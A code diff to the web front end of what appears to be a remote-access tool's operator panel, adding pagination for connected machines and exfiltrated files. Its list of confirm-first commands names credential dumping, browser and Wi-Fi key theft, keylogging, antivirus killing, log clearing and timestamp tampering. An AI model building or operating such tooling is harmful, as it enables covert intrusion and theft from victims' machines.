@@ -7,17 +7,56 @@ let commandHistory = [];
 let historyIndex = -1;
 const MAX_HISTORY_SIZE = 50;
 
+// Pagination state
+let connectionsPagination = {
+    currentPage: 1,
+    pageSize: 25,
+    totalItems: 0,
+    allData: []
+};
+
+let filesPagination = {
+    currentPage: 1,
+    pageSize: 25,
+    totalItems: 0,
+    allData: []
+};
+
 // Dangerous commands that require confirmation
 const DANGEROUS_COMMANDS = [
+    // Windows Security
     'clearev',
     'avkill',
-    'lockscreen',
-    'freeze start',
-    'freeze',
     'disableRDP',
     'disableUAC',
     'disableWindef',
-    'hostsfile remove'
+    'scanreg',
+    
+    // System Control
+    'lockscreen',
+    'displayoff',
+    'freeze start',
+    'freeze',
+    'shutdown',
+    'reboot',
+    
+    // Network Modifications
+    'hostsfile remove',
+    'hostsfile update',
+    'firewall close',
+    
+    // File Operations
+    'hide',
+    'editaccessed',
+    'editcreated',
+    'editmodified',
+    
+    // Security Tools
+    'hashdump',
+    'keylogger start',
+    'chromedump',
+    'wifikeys',
+    'crackpassword'
 ];
 
 // Helper function to check if a command is dangerous
@@ -198,6 +237,17 @@ async function loadConnections() {
         const response = await fetch('/api/connections');
         const connections = await response.json();
         
+        // Store all data for pagination
+        connectionsPagination.allData = connections;
+        connectionsPagination.totalItems = connections.length;
+        
+        // Get paginated data
+        const paginatedConnections = paginateData(
+            connections, 
+            connectionsPagination.currentPage, 
+            connectionsPagination.pageSize
+        );
+        
         const grid = document.getElementById('connectionsGrid');
         
         if (connections.length === 0) {
@@ -207,13 +257,22 @@ async function loadConnections() {
                     <p class="help-text">Connections will appear here when devices connect to port 4040</p>
                 </div>
             `;
+            renderPaginationControls('connectionsPaginationControls', connectionsPagination, 'connections');
             return;
         }
         
-        grid.innerHTML = connections.map(conn => {
+        grid.innerHTML = paginatedConnections.map(conn => {
             const isSelected = selectedConnection && selectedConnection.id === conn.id;
             const statusClass = conn.status === 'online' ? 'online' : 'offline';
             const selectedClass = isSelected ? 'selected' : '';
+            
+            // Format timestamps
+            const lastSeen = conn.last_seen !== 'N/A' && conn.last_seen 
+                ? new Date(conn.last_seen).toLocaleString() 
+                : 'N/A';
+            const connectedAt = conn.connected_at !== 'N/A' && conn.connected_at 
+                ? new Date(conn.connected_at).toLocaleString() 
+                : 'N/A';
             
             return `
                 <div class="connection-card ${statusClass} ${selectedClass}" 
@@ -225,10 +284,15 @@ async function loadConnections() {
                         <p><strong>OS:</strong> ${conn.os}</p>
                         <p><strong>Port:</strong> ${conn.port}</p>
                         <p><strong>Status:</strong> ${conn.status.toUpperCase()}</p>
+                        ${conn.status === 'online' ? `<p><strong>Last Seen:</strong> ${lastSeen}</p>` : ''}
+                        ${conn.status === 'online' ? `<p><strong>Connected:</strong> ${connectedAt}</p>` : ''}
                     </div>
                 </div>
             `;
         }).join('');
+        
+        // Render pagination controls
+        renderPaginationControls('connectionsPaginationControls', connectionsPagination, 'connections');
         
     } catch (error) {
         showToast('Error loading connections', 'error');
@@ -389,7 +453,17 @@ function executeCustomCommand() {
 }
 
 function clearOutput() {
-    document.getElementById('commandOutput').textContent = 'Ready to execute commands...';
+    if (confirm('⚠️ Clear all command output?\n\nThis will remove all execution history from the display.')) {
+        document.getElementById('commandOutput').textContent = 'Ready to execute commands...';
+        showToast('Output cleared', 'info');
+    }
+}
+
+function clearDebugLogs() {
+    if (confirm('⚠️ Clear debug logs?\n\nThis will remove all log entries from the display.')) {
+        document.getElementById('debugLogs').innerHTML = '';
+        showToast('Logs cleared', 'info');
+    }
 }
 
 function copyOutput() {
@@ -448,6 +522,17 @@ async function loadFiles() {
         const response = await fetch('/api/files/downloads');
         const files = await response.json();
         
+        // Store all data for pagination
+        filesPagination.allData = files;
+        filesPagination.totalItems = files.length;
+        
+        // Get paginated data
+        const paginatedFiles = paginateData(
+            files,
+            filesPagination.currentPage,
+            filesPagination.pageSize
+        );
+        
         const grid = document.getElementById('filesGrid');
         
         if (files.length === 0) {
@@ -457,10 +542,11 @@ async function loadFiles() {
                     <p class="help-text">Downloaded files will appear here</p>
                 </div>
             `;
+            renderPaginationControls('filesPaginationControls', filesPagination, 'files');
             return;
         }
         
-        grid.innerHTML = files.map(file => `
+        grid.innerHTML = paginatedFiles.map(file => `
             <div class="file-item">
                 <div class="file-info">
                     <div class="file-name">📄 ${file.name}</div>
@@ -472,6 +558,9 @@ async function loadFiles() {
                    class="download-btn">Download</a>
             </div>
         `).join('');
+        
+        // Render pagination controls
+        renderPaginationControls('filesPaginationControls', filesPagination, 'files');
         
     } catch (error) {
         showToast('Error loading files', 'error');
@@ -795,5 +884,93 @@ async function uploadFile() {
         console.error('Upload error:', error);
         showToast('Upload failed: ' + error.message, 'error');
         cancelUpload();
+    }
+}
+
+// ============================================
+// Pagination Functions
+// ============================================
+
+function paginateData(data, page, pageSize) {
+    const start = (page - 1) * pageSize;
+    const end = start + pageSize;
+    return data.slice(start, end);
+}
+
+function getTotalPages(totalItems, pageSize) {
+    return Math.ceil(totalItems / pageSize) || 1;
+}
+
+function renderPaginationControls(containerId, paginationState, loadFunction) {
+    const container = document.getElementById(containerId);
+    if (!container) return;
+    
+    const totalPages = getTotalPages(paginationState.totalItems, paginationState.pageSize);
+    const currentPage = paginationState.currentPage;
+    
+    if (paginationState.totalItems === 0) {
+        container.innerHTML = '';
+        return;
+    }
+    
+    const start = (currentPage - 1) * paginationState.pageSize + 1;
+    const end = Math.min(currentPage * paginationState.pageSize, paginationState.totalItems);
+    
+    container.innerHTML = `
+        <div class="pagination-controls">
+            <div class="pagination-info">
+                Showing ${start}-${end} of ${paginationState.totalItems}
+            </div>
+            <div class="pagination-buttons">
+                <button onclick="changePage('${loadFunction}', 1)" 
+                        ${currentPage === 1 ? 'disabled' : ''}>
+                    ⏮️ First
+                </button>
+                <button onclick="changePage('${loadFunction}', ${currentPage - 1})" 
+                        ${currentPage === 1 ? 'disabled' : ''}>
+                    ◀️ Prev
+                </button>
+                <span class="page-number">Page ${currentPage} of ${totalPages}</span>
+                <button onclick="changePage('${loadFunction}', ${currentPage + 1})" 
+                        ${currentPage === totalPages ? 'disabled' : ''}>
+                    Next ▶️
+                </button>
+                <button onclick="changePage('${loadFunction}', ${totalPages})" 
+                        ${currentPage === totalPages ? 'disabled' : ''}>
+                    Last ⏭️
+                </button>
+            </div>
+            <div class="pagination-size">
+                <label>Per page:</label>
+                <select onchange="changePageSize('${loadFunction}', this.value)">
+                    <option value="10" ${paginationState.pageSize === 10 ? 'selected' : ''}>10</option>
+                    <option value="25" ${paginationState.pageSize === 25 ? 'selected' : ''}>25</option>
+                    <option value="50" ${paginationState.pageSize === 50 ? 'selected' : ''}>50</option>
+                    <option value="100" ${paginationState.pageSize === 100 ? 'selected' : ''}>100</option>
+                </select>
+            </div>
+        </div>
+    `;
+}
+
+function changePage(loadFunction, newPage) {
+    if (loadFunction === 'connections') {
+        connectionsPagination.currentPage = newPage;
+        loadConnections();
+    } else if (loadFunction === 'files') {
+        filesPagination.currentPage = newPage;
+        loadFiles();
+    }
+}
+
+function changePageSize(loadFunction, newSize) {
+    if (loadFunction === 'connections') {
+        connectionsPagination.pageSize = parseInt(newSize);
+        connectionsPagination.currentPage = 1;
+        loadConnections();
+    } else if (loadFunction === 'files') {
+        filesPagination.pageSize = parseInt(newSize);
+        filesPagination.currentPage = 1;
+        loadFiles();
     }
 }
